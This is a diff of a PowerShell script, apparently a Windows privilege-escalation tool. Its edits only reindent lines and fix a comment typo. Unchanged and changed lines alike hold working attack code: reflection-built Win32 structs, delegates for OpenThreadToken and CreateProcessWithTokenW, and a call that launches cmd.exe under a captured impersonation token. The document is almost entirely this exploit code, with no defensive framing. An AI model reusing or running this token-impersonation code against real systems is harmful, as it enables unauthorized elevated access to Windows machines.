@@ -93,13 +93,13 @@ function Local:Get-DelegateType
         SE_PRIVILEGE_REMOVED = 0x4
     }
 
-    $Win32Constants = New-Object PSObject -Property $Constants
+  $Win32Constants = New-Object PSObject -Property $Constants
 	
-    $Domain = [AppDomain]::CurrentDomain
-    $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
-    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
-    $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+  $Domain = [AppDomain]::CurrentDomain
+  $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+  $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+  $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
+  $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
 
 
   #Struct STARTUPINFO
@@ -123,7 +123,7 @@ function Local:Get-DelegateType
   $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
   $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
   $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
-	$STARTUPINFO = $TypeBuilder.CreateType()
+  $STARTUPINFO = $TypeBuilder.CreateType()
 
   #Struct PROCESS_INFORMATION
   $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
@@ -132,7 +132,7 @@ function Local:Get-DelegateType
   $TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
   $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
   $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
- $PROCESS_INFORMATION = $TypeBuilder.CreateType()
+  $PROCESS_INFORMATION = $TypeBuilder.CreateType()
 
     
   #API's
@@ -142,17 +142,17 @@ function Local:Get-DelegateType
   $OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
   $OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)
     
-   $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
-   $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
-   $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
+  $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
+  $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
+  $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
 	
-   $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
-   $CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
-   $CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)
+  $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
+  $CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
+  $CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)
 	
-   $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
-   $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
-   $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
+  $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
+  $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
+  $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
 	
   $memsetAddr = Get-ProcAddress msvcrt.dll memset
   $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
@@ -203,7 +203,7 @@ $memset.Invoke($ProcessInfoPtr, 0, $ProcessInfoSize) | Out-Null
 $processname="c:\windows\system32\cmd.exe"
 $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($processname)
 $ProcessArgsPtr = [IntPtr]::Zero
-#CreateProcessWithTokenW does not care if the token is impersonation and not primar
+#CreateProcessWithTokenW does not care if the token is impersonation and not primary
 $Success = $CreateProcessWithTokenW.Invoke($ThreadToken, 0x0,$ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
 $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
 echo "CreateProcessWithToken: $Success  $ErrorCode" 
